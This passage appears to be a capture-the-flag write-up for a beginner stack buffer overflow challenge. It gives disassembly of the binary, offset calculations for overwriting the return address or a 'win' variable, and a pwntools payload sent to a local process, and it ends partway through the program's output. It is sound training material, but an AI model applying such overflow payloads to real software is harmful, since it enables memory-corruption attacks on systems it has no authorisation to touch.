  4027b9:       89 bd ec ef ff ff       mov    DWORD PTR [rbp-0x1014],edi
  4027bf:       48 89 b5 e0 ef ff ff    mov    QWORD PTR [rbp-0x1020],rsi
  4027c6:       48 89 95 d8 ef ff ff    mov    QWORD PTR [rbp-0x1028],rdx
  4027cd:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
  4027d4:       00 00
  4027d6:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  4027da:       31 c0                   xor    eax,eax
  4027dc:       48 8b 05 4d 28 00 00    mov    rax,QWORD PTR [rip+0x284d]        # 405030 <stdin@GLIBC_2.2.5>
  4027e3:       b9 00 00 00 00          mov    ecx,0x0
  4027e8:       ba 02 00 00 00          mov    edx,0x2
  4027ed:       be 00 00 00 00          mov    esi,0x0
  4027f2:       48 89 c7                mov    rdi,rax
  4027f5:       e8 76 e9 ff ff          call   401170 <setvbuf@plt>
  4027fa:       48 8b 05 1f 28 00 00    mov    rax,QWORD PTR [rip+0x281f]        # 405020 <stdout@GLIBC_2.2.5>
  402801:       b9 00 00 00 00          mov    ecx,0x0
  402806:       ba 02 00 00 00          mov    edx,0x2
  40280b:       be 00 00 00 00          mov    esi,0x0
  402810:       48 89 c7                mov    rdi,rax
  402813:       e8 58 e9 ff ff          call   401170 <setvbuf@plt>
  402818:       48 8b 95 d8 ef ff ff    mov    rdx,QWORD PTR [rbp-0x1028]
  40281f:       48 8b 8d e0 ef ff ff    mov    rcx,QWORD PTR [rbp-0x1020]
  402826:       8b 85 ec ef ff ff       mov    eax,DWORD PTR [rbp-0x1014]
  40282c:       48 89 ce                mov    rsi,rcx
  40282f:       89 c7                   mov    edi,eax
  402831:       e8 d3 fa ff ff          call   402309 <challenge>
  402836:       b8 00 00 00 00          mov    eax,0x0
  40283b:       48 8b 4d f8             mov    rcx,QWORD PTR [rbp-0x8]
  40283f:       64 48 33 0c 25 28 00    xor    rcx,QWORD PTR fs:0x28
  402846:       00 00
  402848:       74 05                   je     40284f <main+0xae>
  40284a:       e8 e1 e8 ff ff          call   401130 <__stack_chk_fail@plt>
  40284f:       c9                      leave
  402850:       c3                      ret
  402851:       66 2e 0f 1f 84 00 00    cs nop WORD PTR [rax+rax*1+0x0]
  402858:       00 00 00
  40285b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000402860 <__libc_csu_init>:
  402860:       f3 0f 1e fa             endbr64
  402864:       41 57                   push   r15
  402866:       4c 8d 3d 0b 25 00 00    lea    r15,[rip+0x250b]        # 404d78 <__frame_dummy_init_array_entry>
  40286d:       41 56                   push   r14
  40286f:       49 89 d6                mov    r14,rdx
  402872:       41 55                   push   r13
  402874:       49 89 f5                mov    r13,rsi
  402877:       41 54                   push   r12
  402879:       41 89 fc                mov    r12d,edi
  40287c:       55                      push   rbp
  40287d:       48 8d 2d fc 24 00 00    lea    rbp,[rip+0x24fc]        # 404d80 <__do_global_dtors_aux_fini_array_entry>
  402884:       53                      push   rbx
  402885:       4c 29 fd                sub    rbp,r15
  402888:       48 83 ec 08             sub    rsp,0x8
  40288c:       e8 6f e7 ff ff          call   401000 <_init>
  402891:       48 c1 fd 03             sar    rbp,0x3
  402895:       74 1f                   je     4028b6 <__libc_csu_init+0x56>
  402897:       31 db                   xor    ebx,ebx
  402899:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
  4028a0:       4c 89 f2                mov    rdx,r14
  4028a3:       4c 89 ee                mov    rsi,r13
  4028a6:       44 89 e7                mov    edi,r12d
  4028a9:       41 ff 14 df             call   QWORD PTR [r15+rbx*8]
  4028ad:       48 83 c3 01             add    rbx,0x1
  4028b1:       48 39 dd                cmp    rbp,rbx
  4028b4:       75 ea                   jne    4028a0 <__libc_csu_init+0x40>
  4028b6:       48 83 c4 08             add    rsp,0x8
  4028ba:       5b                      pop    rbx
  4028bb:       5d                      pop    rbp
  4028bc:       41 5c                   pop    r12
  4028be:       41 5d                   pop    r13
  4028c0:       41 5e                   pop    r14
  4028c2:       41 5f                   pop    r15
  4028c4:       c3                      ret
  4028c5:       66 66 2e 0f 1f 84 00    data16 cs nop WORD PTR [rax+rax*1+0x0]
  4028cc:       00 00 00 00

00000000004028d0 <__libc_csu_fini>:
  4028d0:       f3 0f 1e fa             endbr64
  4028d4:       c3                      ret

Disassembly of section .fini:

00000000004028d8 <_fini>:
  4028d8:       f3 0f 1e fa             endbr64
  4028dc:       48 83 ec 08             sub    rsp,0x8
  4028e0:       48 83 c4 08             add    rsp,0x8
  4028e4:       c3                      ret
```


here if we ignore all the nop padding calls we can see the `win` function is at : `0x402202`

```
0000000000402202 <win>:
  402202:       f3 0f 1e fa             endbr64
  402206:       55                      push   rbp
  402207:       48 89 e5                mov    rbp,rsp
  40220a:       48 8d 3d df 0e 00 00    lea    rdi,[rip+0xedf]        # 4030f0 <_IO_stdin_used+0xf0>
  402211:       e8 fa ee ff ff          call   401110 <puts@plt>
  402216:       be 00 00 00 00          mov    esi,0x0
  40221b:       48 8d 3d ea 0e 00 00    lea    rdi,[rip+0xeea]        # 40310c <_IO_stdin_used+0x10c>
  402222:       b8 00 00 00 00          mov    eax,0x0
  402227:       e8 54 ef ff ff          call   401180 <open@plt>
  40222c:       89 05 0e 2e 00 00       mov    DWORD PTR [rip+0x2e0e],eax        # 405040 <flag_fd.5714>
  402232:       8b 05 08 2e 00 00       mov    eax,DWORD PTR [rip+0x2e08]        # 405040 <flag_fd.5714>
  402238:       85 c0                   test   eax,eax
  40223a:       79 4d                   jns    402289 <win+0x87>
  40223c:       e8 bf ee ff ff          call   401100 
```



and our challenge function is at `0x402309`

```
0000000000402309 <challenge>:
  402309:       f3 0f 1e fa             endbr64
  40230d:       55                      push   rbp
  40230e:       48 89 e5                mov    rbp,rsp
  402311:       48 83 c4 80             add    rsp,0xffffffffffffff80
  402315:       89 7d 9c                mov    DWORD PTR [rbp-0x64],edi
  402318:       48 89 75 90             mov    QWORD PTR [rbp-0x70],rsi
  40231c:       48 89 55 88             mov    QWORD PTR [rbp-0x78],rdx
  402320:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
  402327:       00 00
  402329:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  40232d:       31 c0                   xor    eax,eax
  40232f:       48 c7 45 b0 00 00 00    mov    QWORD PTR [rbp-0x50],0x0
  402336:       00
  402337:       48 c7 45 b8 00 00 00    mov    QWORD PTR [rbp-0x48],0x0
  40233e:       00
  40233f:       48 c7 45 c0 00 00 00    mov    QWORD PTR [rbp-0x40],0x0
  402346:       00
  402347:       48 c7 45 c8 00 00 00    mov    QWORD PTR [rbp-0x38],0x0
  40234e:       00
  40234f:       48 c7 45 d0 00 00 00    mov    QWORD PTR [rbp-0x30],0x0
  402356:       00
  402357:       48 c7 45 d8 00 00 00    mov    QWORD PTR [rbp-0x28],0x0
  40235e:       00
  40235f:       48 c7 45 e0 00 00 00    mov    QWORD PTR [rbp-0x20],0x0
  402366:       00
  402367:       48 c7 45 e8 00 00 00    mov    QWORD PTR [rbp-0x18],0x0
  40236e:       00
  40236f:       48 c7 45 a8 00 00 00    mov    QWORD PTR [rbp-0x58],0x0
  402376:       00
  402377:       48 8d 3d 7a 0e 00 00    lea    rdi,[rip+0xe7a]        # 4031f8 <_IO_stdin_used+0x1f8>
  40237e:       e8 8d ed ff ff          call   401110 <puts@plt>
  402383:       48 89 e0                mov    rax,rsp
  402386:       48 89 05 0b 2e 00 00    mov    QWORD PTR [rip+0x2e0b],rax        # 405198 <sp_>
  40238d:       48 89 e8                mov    rax,rbp
  402390:       48 89 05 e1 2d 00 00    mov    QWORD PTR [rip+0x2de1],rax        # 405178 <bp_>
  402397:       48 8b 15 da 2d 00 00    mov    rdx,QWORD PTR [rip+0x2dda]        # 405178 <bp_>
  40239e:       48 8b 05 f3 2d 00 00    mov    rax,QWORD PTR [rip+0x2df3]        # 405198 <sp_>
  4023a5:       48 29 c2                sub    rdx,rax
  4023a8:       48 89 d0                mov    rax,rdx
  4023ab:       48 c1 e8 03             shr    rax,0x3
  4023af:       48 83 c0 02             add    rax,0x2
  4023b3:       48 89 05 ce 2d 00 00    mov    QWORD PTR [rip+0x2dce],rax        # 405188 <sz_>
  4023ba:       48 8b 05 b7 2d 00 00    mov    rax,QWORD PTR [rip+0x2db7]        # 405178 <bp_>
  4023c1:       48 83 c0 08             add    rax,0x8
  4023c5:       48 89 05 c4 2d 00 00    mov    QWORD PTR [rip+0x2dc4],rax        # 405190 <rp_>
  4023cc:       48 8d 3d 5d 0e 00 00    lea    rdi,[rip+0xe5d]        # 403230 <_IO_stdin_used+0x230>
  4023d3:       e8 38 ed ff ff          call   401110 <puts@plt>
  4023d8:       48 8b 15 a9 2d 00 00    mov    rdx,QWORD PTR [rip+0x2da9]        # 405188 <sz_>
  4023df:       48 8b 05 b2 2d 00 00    mov    rax,QWORD PTR [rip+0x2db2]        # 405198 <sp_>
  4023e6:       48 89 d6                mov    rsi,rdx
  4023e9:       48 89 c7                mov    rdi,rax
  4023ec:       e8 a5 ee ff ff          call   401296 <DUMP_STACK>
  4023f1:       48 8b 15 80 2d 00 00    mov    rdx,QWORD PTR [rip+0x2d80]        # 405178 <bp_>
  4023f8:       48 8b 05 99 2d 00 00    mov    rax,QWORD PTR [rip+0x2d99]        # 405198 <sp_>
  4023ff:       48 89 c6                mov    rsi,rax
  402402:       48 8d 3d 6f 0e 00 00    lea    rdi,[rip+0xe6f]        # 403278 <_IO_stdin_used+0x278>
  402409:       b8 00 00 00 00          mov    eax,0x0
  40240e:       e8 2d ed ff ff          call   401140 <printf@plt>
  402413:       48 8b 05 6e 2d 00 00    mov    rax,QWORD PTR [rip+0x2d6e]        # 405188 <sz_>
  40241a:       48 89 c6                mov    rsi,rax
  40241d:       48 8d 3d 9c 0e 00 00    lea    rdi,[rip+0xe9c]        # 4032c0 <_IO_stdin_used+0x2c0>
  402424:       b8 00 00 00 00          mov    eax,0x0
  402429:       e8 12 ed ff ff          call   401140 <printf@plt>
  40242e:       48 8d 3d d3 0e 00 00    lea    rdi,[rip+0xed3]        # 403308 <_IO_stdin_used+0x308>
  402435:       e8 d6 ec ff ff          call   401110 <puts@plt>
  40243a:       48 8b 05 47 2d 00 00    mov    rax,QWORD PTR [rip+0x2d47]        # 405188 <sz_>
  402441:       48 c1 e0 03             shl    rax,0x3
  402445:       48 89 c6                mov    rsi,rax
  402448:       48 8d 3d fe 0e 00 00    lea    rdi,[rip+0xefe]        # 40334d <_IO_stdin_used+0x34d>
  40244f:       b8 00 00 00 00          mov    eax,0x0
  402454:       e8 e7 ec ff ff          call   401140 <printf@plt>
  402459:       48 8d 45 b0             lea    rax,[rbp-0x50]
  40245d:       48 89 c6                mov    rsi,rax
  402460:       48 8d 3d 01 0f 00 00    lea    rdi,[rip+0xf01]        # 403368 <_IO_stdin_used+0x368>
  402467:       b8 00 00 00 00          mov    eax,0x0
  40246c:       e8 cf ec ff ff          call   401140 <printf@plt>
  402471:       48 8d 3d 38 0f 00 00    lea    rdi,[rip+0xf38]        # 4033b0 <_IO_stdin_used+0x3b0>
  402478:       e8 93 ec ff ff          call   401110 <puts@plt>
  40247d:       48 8d 3d 7c 0f 00 00    lea    rdi,[rip+0xf7c]        # 403400 <_IO_stdin_used+0x400>
  402484:       e8 87 ec ff ff          call   401110 <puts@plt>
  402489:       be 3a 00 00 00          mov    esi,0x3a
  40248e:       48 8d 3d 9b 0f 00 00    lea    rdi,[rip+0xf9b]        # 403430 <_IO_stdin_used+0x430>
  402495:       b8 00 00 00 00          mov    eax,0x0
  40249a:       e8 a1 ec ff ff          call   401140 <printf@plt>
  40249f:       48 8d 3d e2 0f 00 00    lea    rdi,[rip+0xfe2]        # 403488 <_IO_stdin_used+0x488>
  4024a6:       e8 65 ec ff ff          call   401110 <puts@plt>
  4024ab:       48 8d 3d 0e 10 00 00    lea    rdi,[rip+0x100e]        # 4034c0 <_IO_stdin_used+0x4c0>
  4024b2:       e8 59 ec ff ff          call   401110 <puts@plt>
  4024b7:       48 8d 3d 32 10 00 00    lea    rdi,[rip+0x1032]        # 4034f0 <_IO_stdin_used+0x4f0>
  4024be:       e8 4d ec ff ff          call   401110 <puts@plt>
  4024c3:       48 8d 3d 56 10 00 00    lea    rdi,[rip+0x1056]        # 403520 <_IO_stdin_used+0x520>
  4024ca:       e8 41 ec ff ff          call   401110 <puts@plt>
  4024cf:       48 8d 3d 92 10 00 00    lea    rdi,[rip+0x1092]        # 403568 <_IO_stdin_used+0x568>
  4024d6:       e8 35 ec ff ff          call   401110 <puts@plt>
  4024db:       48 8d 45 b0             lea    rax,[rbp-0x50]
  4024df:       48 83 c0 3c             add    rax,0x3c
  4024e3:       ba 3c 00 00 00          mov    edx,0x3c
  4024e8:       48 89 c6                mov    rsi,rax
  4024eb:       48 8d 3d be 10 00 00    lea    rdi,[rip+0x10be]        # 4035b0 <_IO_stdin_used+0x5b0>
  4024f2:       b8 00 00 00 00          mov    eax,0x0
  4024f7:       e8 44 ec ff ff          call   401140 <printf@plt>
  4024fc:       48 8d 3d 05 11 00 00    lea    rdi,[rip+0x1105]        # 403608 <_IO_stdin_used+0x608>
  402503:       e8 08 ec ff ff          call   401110 <puts@plt>
  402508:       48 8d 3d 59 11 00 00    lea    rdi,[rip+0x1159]        # 403668 <_IO_stdin_used+0x668>
  40250f:       e8 fc eb ff ff          call   401110 <puts@plt>
  402514:       48 8d 3d 95 11 00 00    lea    rdi,[rip+0x1195]        # 4036b0 <_IO_stdin_used+0x6b0>
  40251b:       e8 f0 eb ff ff          call   401110 <puts@plt>
  402520:       48 8d 3d d1 11 00 00    lea    rdi,[rip+0x11d1]        # 4036f8 <_IO_stdin_used+0x6f8>
  402527:       e8 e4 eb ff ff          call   401110 <puts@plt>
  40252c:       48 8d 3d 0d 12 00 00    lea    rdi,[rip+0x120d]        # 403740 <_IO_stdin_used+0x740>
  402533:       e8 d8 eb ff ff          call   401110 <puts@plt>
  402538:       48 8b 05 39 2c 00 00    mov    rax,QWORD PTR [rip+0x2c39]        # 405178 <bp_>
  40253f:       48 89 05 2a 2c 00 00    mov    QWORD PTR [rip+0x2c2a],rax        # 405170 <cp_>
  402546:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
  40254d:       00 00
  40254f:       48 89 05 2a 2c 00 00    mov    QWORD PTR [rip+0x2c2a],rax        # 405180 <cv_>
  402556:       eb 12                   jmp    40256a <challenge+0x261>
  402558:       48 8b 05 11 2c 00 00    mov    rax,QWORD PTR [rip+0x2c11]        # 405170 <cp_>
  40255f:       48 83 e8 08             sub    rax,0x8
  402563:       48 89 05 06 2c 00 00    mov    QWORD PTR [rip+0x2c06],rax        # 405170 <cp_>
  40256a:       48 8b 05 ff 2b 00 00    mov    rax,QWORD PTR [rip+0x2bff]        # 405170 <cp_>
  402571:       48 8b 10                mov    rdx,QWORD PTR [rax]
  402574:       48 8b 05 05 2c 00 00    mov    rax,QWORD PTR [rip+0x2c05]        # 405180 <cv_>
  40257b:       48 39 c2                cmp    rdx,rax
  40257e:       75 d8                   jne    402558 <challenge+0x24f>
  402580:       48 c7 45 a8 00 10 00    mov    QWORD PTR [rbp-0x58],0x1000
  402587:       00
  402588:       48 8b 45 a8             mov    rax,QWORD PTR [rbp-0x58]
  40258c:       48 89 c6                mov    rsi,rax
  40258f:       48 8d 3d fa 11 00 00    lea    rdi,[rip+0x11fa]        # 403790 <_IO_stdin_used+0x790>
  402596:       b8 00 00 00 00          mov    eax,0x0
  40259b:       e8 a0 eb ff ff          call   401140 <printf@plt>
  4025a0:       48 8d 45 b0             lea    rax,[rbp-0x50]
  4025a4:       48 89 c6                mov    rsi,rax
  4025a7:       48 8d 3d 12 12 00 00    lea    rdi,[rip+0x1212]        # 4037c0 <_IO_stdin_used+0x7c0>
  4025ae:       b8 00 00 00 00          mov    eax,0x0
  4025b3:       e8 88 eb ff ff          call   401140 <printf@plt>
  4025b8:       48 8b 45 a8             mov    rax,QWORD PTR [rbp-0x58]
  4025bc:       48 8d 50 c6             lea    rdx,[rax-0x3a]
  4025c0:       48 8d 4d b0             lea    rcx,[rbp-0x50]
  4025c4:       48 8b 45 a8             mov    rax,QWORD PTR [rbp-0x58]
  4025c8:       48 01 c8                add    rax,rcx
  4025cb:       48 89 c6                mov    rsi,rax
  4025ce:       48 8d 3d 33 12 00 00    lea    rdi,[rip+0x1233]        # 403808 <_IO_stdin_used+0x808>
  4025d5:       b8 00 00 00 00          mov    eax,0x0
  4025da:       e8 61 eb ff ff          call   401140 <printf@plt>
  4025df:       48 8b 45 a8             mov    rax,QWORD PTR [rbp-0x58]
  4025e3:       48 89 c6                mov    rsi,rax
  4025e6:       48 8d 3d 73 12 00 00    lea    rdi,[rip+0x1273]        # 403860 <_IO_stdin_used+0x860>
  4025ed:       b8 00 00 00 00          mov    eax,0x0
  4025f2:       e8 49 eb ff ff          call   401140 <printf@plt>
  4025f7:       48 8b 55 a8             mov    rdx,QWORD PTR [rbp-0x58]
  4025fb:       48 8d 45 b0             lea    rax,[rbp-0x50]
  4025ff:       48 89 c6                mov    rsi,rax
  402602:       bf 00 00 00 00          mov    edi,0x0
  402607:       e8 54 eb ff ff          call   401160 <read@plt>
  40260c:       89 45 a4                mov    DWORD PTR [rbp-0x5c],eax
  40260f:       83 7d a4 00             cmp    DWORD PTR [rbp-0x5c],0x0
  402613:       79 2c                   jns    402641 <challenge+0x338>
  402615:       e8 e6 ea ff ff          call   401100 <__errno_location@plt>
  40261a:       8b 00                   mov    eax,DWORD PTR [rax]
  40261c:       89 c7                   mov    edi,eax
  40261e:       e8 7d eb ff ff          call   4011a0 <strerror@plt>
  402623:       48 89 c6                mov    rsi,rax
  402626:       48 8d 3d 5b 12 00 00    lea    rdi,[rip+0x125b]        # 403888 <_IO_stdin_used+0x888>
  40262d:       b8 00 00 00 00          mov    eax,0x0
  402632:       e8 09 eb ff ff          call   401140 <printf@plt>
  402637:       bf 01 00 00 00          mov    edi,0x1
  40263c:       e8 4f eb ff ff          call   401190 <exit@plt>
  402641:       8b 45 a4                mov    eax,DWORD PTR [rbp-0x5c]
  402644:       89 c6                   mov    esi,eax
  402646:       48 8d 3d 5f 12 00 00    lea    rdi,[rip+0x125f]        # 4038ac <_IO_stdin_used+0x8ac>
  40264d:       b8 00 00 00 00          mov    eax,0x0
  402652:       e8 e9 ea ff ff          call   401140 <printf@plt>
  402657:       48 8d 3d 62 12 00 00    lea    rdi,[rip+0x1262]        # 4038c0 <_IO_stdin_used+0x8c0>
  40265e:       e8 ad ea ff ff          call   401110 <puts@plt>
  402663:       48 8b 15 1e 2b 00 00    mov    rdx,QWORD PTR [rip+0x2b1e]        # 405188 <sz_>
  40266a:       48 8b 05 27 2b 00 00    mov    rax,QWORD PTR [rip+0x2b27]        # 405198 <sp_>
  402671:       48 89 d6                mov    rsi,rdx
  402674:       48 89 c7                mov    rdi,rax
  402677:       e8 1a ec ff ff          call   401296 <DUMP_STACK>
  40267c:       48 8d 3d 66 12 00 00    lea    rdi,[rip+0x1266]        # 4038e9 <_IO_stdin_used+0x8e9>
  402683:       e8 88 ea ff ff          call   401110 <puts@plt>
  402688:       48 8d 45 b0             lea    rax,[rbp-0x50]
  40268c:       48 89 c6                mov    rsi,rax
  40268f:       48 8d 3d 72 12 00 00    lea    rdi,[rip+0x1272]        # 403908 <_IO_stdin_used+0x908>
  402696:       b8 00 00 00 00          mov    eax,0x0
  40269b:       e8 a0 ea ff ff          call   401140 <printf@plt>
  4026a0:       48 8b 05 d1 2a 00 00    mov    rax,QWORD PTR [rip+0x2ad1]        # 405178 <bp_>
  4026a7:       48 89 c6                mov    rsi,rax
  4026aa:       48 8d 3d 7f 12 00 00    lea    rdi,[rip+0x127f]        # 403930 <_IO_stdin_used+0x930>
  4026b1:       b8 00 00 00 00          mov    eax,0x0
  4026b6:       e8 85 ea ff ff          call   401140 <printf@plt>
  4026bb:       48 8b 05 ce 2a 00 00    mov    rax,QWORD PTR [rip+0x2ace]        # 405190 <rp_>
  4026c2:       48 89 c6                mov    rsi,rax
  4026c5:       48 8d 3d 94 12 00 00    lea    rdi,[rip+0x1294]        # 403960 <_IO_stdin_used+0x960>
  4026cc:       b8 00 00 00 00          mov    eax,0x0
  4026d1:       e8 6a ea ff ff          call   401140 <printf@plt>
  4026d6:       48 8b 05 b3 2a 00 00    mov    rax,QWORD PTR [rip+0x2ab3]        # 405190 <rp_>
  4026dd:       48 8b 00                mov    rax,QWORD PTR [rax]
  4026e0:       48 89 c6                mov    rsi,rax
  4026e3:       48 8d 3d b6 12 00 00    lea    rdi,[rip+0x12b6]        # 4039a0 <_IO_stdin_used+0x9a0>
  4026ea:       b8 00 00 00 00          mov    eax,0x0
  4026ef:       e8 4c ea ff ff          call   401140 <printf@plt>
  4026f4:       48 8b 05 75 2a 00 00    mov    rax,QWORD PTR [rip+0x2a75]        # 405170 <cp_>
  4026fb:       48 89 c6                mov    rsi,rax
  4026fe:       48 8d 3d d3 12 00 00    lea    rdi,[rip+0x12d3]        # 4039d8 <_IO_stdin_used+0x9d8>
  402705:       b8 00 00 00 00          mov    eax,0x0
  40270a:       e8 31 ea ff ff          call   401140 <printf@plt>
  40270f:       48 8b 05 5a 2a 00 00    mov    rax,QWORD PTR [rip+0x2a5a]        # 405170 <cp_>
  402716:       48 8b 00                mov    rax,QWORD PTR [rax]
  402719:       48 89 c6                mov    rsi,rax
  40271c:       48 8d 3d d5 12 00 00    lea    rdi,[rip+0x12d5]        # 4039f8 <_IO_stdin_used+0x9f8>
  402723:       b8 00 00 00 00          mov    eax,0x0
  402728:       e8 13 ea ff ff          call   401140 <printf@plt>
  40272d:       48 8d 45 b0             lea    rax,[rbp-0x50]
  402731:       48 83 c0 3c             add    rax,0x3c
  402735:       48 89 c6                mov    rsi,rax
  402738:       48 8d 3d d9 12 00 00    lea    rdi,[rip+0x12d9]        # 403a18 <_IO_stdin_used+0xa18>
  40273f:       b8 00 00 00 00          mov    eax,0x0
  402744:       e8 f7 e9 ff ff          call   401140 <printf@plt>
  402749:       8b 45 ec                mov    eax,DWORD PTR [rbp-0x14]
  40274c:       89 c6                   mov    esi,eax
  40274e:       48 8d 3d f3 12 00 00    lea    rdi,[rip+0x12f3]        # 403a48 <_IO_stdin_used+0xa48>
  402755:       b8 00 00 00 00          mov    eax,0x0
  40275a:       e8 e1 e9 ff ff          call   401140 <printf@plt>
  40275f:       bf 0a 00 00 00          mov    edi,0xa
  402764:       e8 87 e9 ff ff          call   4010f0 <putchar@plt>
  402769:       8b 45 ec                mov    eax,DWORD PTR [rbp-0x14]
  40276c:       85 c0                   test   eax,eax
  40276e:       74 0a                   je     40277a <challenge+0x471>
  402770:       b8 00 00 00 00          mov    eax,0x0
  402775:       e8 88 fa ff ff          call   402202 <win>
  40277a:       48 8d 3d f1 12 00 00    lea    rdi,[rip+0x12f1]        # 403a72 <_IO_stdin_used+0xa72>
  402781:       e8 8a e9 ff ff          call   401110 <puts@plt>
  402786:       b8 00 00 00 00          mov    eax,0x0
  40278b:       48 8b 4d f8             mov    rcx,QWORD PTR [rbp-0x8]
  40278f:       64 48 33 0c 25 28 00    xor    rcx,QWORD PTR fs:0x28
  402796:       00 00
  402798:       74 05                   je     40279f <challenge+0x496>
  40279a:       e8 91 e9 ff ff          call   401130 <__stack_chk_fail@plt>
  40279f:       c9                      leave
  4027a0:       c3                      ret
```


there are two ways to solve this chall :

overwrite the RIP with our win address or overwrite the win variable with a non zero value lets do the former first.

- we can calculate the offset using a cyclic pattern but the challenge itself gives us the offsets : `0x7ffc2e140728 - 0x7ffc2e1406d0 = 0x58 = 88 bytes`
 
so if we send 88 bytes + the address of win we should be able to get the flag


- for the second way, we also know from the output of the binary itself that The input buffer begins at `0x7ffc2e1406d0`
The "win" variable is stored at `0x7ffc2e14070c`, 60 bytes after the start of  input buffer.

address(win) - address(buffer) = `0x7ffc2e14070c` - `0x7ffc2e1406d0` = `0x3C` = 60 bytes

so we can send 60 bytes of `A`+ our integer value to get the flag.

lets see the 2nd method in practise : 

```
In [2]: r = process('./binary-exploitation-first-overflow-w')
[x] Starting local process './binary-exploitation-first-overflow-w'
[+] Starting local process './binary-exploitation-first-overflow-w': pid 241

In [3]: r.send(b'A'*60+p32(1))

In [4]: r.readall()
[x] Receiving all data
[x] Receiving all data: 0B
[*] Process './binary-exploitation-first-overflow-w' stopped with exit code 0 (pid 241)
[x] Receiving all data: 4.00KB
[x] Receiving all data: 5.76KB
[+] Receiving all data: Done (5.76KB)
Out[4]: b'The challenge() function has just been launched!\nBefore we do anything, let\'s take a look at challenge()\'s stack frame:\n+---------------------------------+-------------------------+--------------------+\n|                  Stack location |            Data (bytes) |      Data (LE int) |\n+---------------------------------+-------------------------+--------------------+\n| 0x00007ffddb86e7b0 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffddb86e7b8 (rsp+0x0008) | 78 f9 86 db fd 7f 00 00 | 0x00007ffddb86f978 |\n| 0x00007ffddb86e7c0 (rsp+0x0010) | 68 f9 86 db fd 7f 00 00 | 0x00007ffddb86f968 |\n| 0x00007ffddb86e7c8 (rsp+0x0018) | 25 45 b6 f2 01 00 00 00 | 0x00000001f2b64525 |\n| 0x00007ffddb86e7d0 (rsp+0x0020) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |\n| 0x00007ffddb86e7d8 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffddb86e7e0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffddb86e7e8 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffddb86e7f0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffddb86e7f8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffddb86e800 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffddb86e808 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffddb86e810 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffddb86e818 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffddb86e820 (rsp+0x0070) | b0 11 40 00 00 00 00 00 | 0x00000000004011b0 |\n| 0x00007ffddb86e828 (rsp+0x0078) | 00 69 6b 63 06 ce 35 5c | 0x5c35ce06636b6900 |\n| 0x00007ffddb86e830 (rsp+0x0080) | 70 f8 86 db fd 7f 00 00 | 0x00007ffddb86f870 |\n| 0x00007ffddb86e838 (rsp+0x0088) | 36 28 40 00 00 00 00 00 | 0x0000000000402836 |\n+---------------------------------+-------------------------+--------------------+\nOur stack pointer points to 0x7ffddb86e7b0, and our base pointer points to 0x7ffddb86e830.\nThis means that we have (decimal) 18 8-byte words in our stack frame,\nincluding the saved base pointer and the saved return address, for a\ntotal of 144 bytes.\nThe input buffer begins at 0x7ffddb86e7e0, partway through the stack frame,\n("above" it in the stack are other local variables used by the function).\nYour input will be read into this buffer.\nThe buffer is 58 bytes long, but the program will let you provide an arbitrarily\nlarge input length, and thus overflow the buffer.\n\nIn this level, there is a "win" variable.\nBy default, the value of this variable is zero.\nHowever, when this variable is non-zero, the flag will be printed.\nYou can make this variable be non-zero by overflowing the input buffer.\nThe "win" variable is stored at 0x7ffddb86e81c, 60 bytes after the start of your input buffer.\n\nWe have disabled the following standard memory corruption mitigations for this challenge:\n- the binary is *not* position independent. This means that it will be\nlocated at the same spot every time it is run, which means that by\nanalyzing the binary (using objdump or reading this output), you can\nknow the exact value that you need to overwrite the return address with.\n\nYou have chosen to send 4096 bytes of input!\nThis will allow you to write from 0x7ffddb86e7e0 (the start of the input buffer)\nright up to (but not including) 0x7ffddb86f7e0 (which is 4038 bytes beyond the end of the buffer).\nSend your payload (up to 4096 bytes)!\nYou sent 64 bytes!\nLet\'s see what happened with the stack:\n\n+---------------------------------+-------------------------+--------------------+\n|                  Stack location |            Data (bytes) |      Data (LE int) |\n+---------------------------------+-------------------------+--------------------+\n| 0x00007ffddb86e7b0 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffddb86e7b8 (rsp+0x0008) | 78 f9 86 db fd 7f 00 00 | 0x00007ffddb86f978 |\n| 0x00007ffddb86e7c0 (rsp+0x0010) | 68 f9 86 db fd 7f 00 00 | 0x00007ffddb86f968 |\n| 0x00007ffddb86e7c8 (rsp+0x0018) | 25 45 b6 f2 01 00 00 00 | 0x00000001f2b64525 |\n| 0x00007ffddb86e7d0 (rsp+0x0020) | 00 10 00 00 40 00 00 00 | 0x0000004000001000 |\n| 0x00007ffddb86e7d8 (rsp+0x0028) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |\n| 0x00007ffddb86e7e0 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffddb86e7e8 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffddb86e7f0 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffddb86e7f8 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffddb86e800 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffddb86e808 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffddb86e810 (rsp+0x0060) | 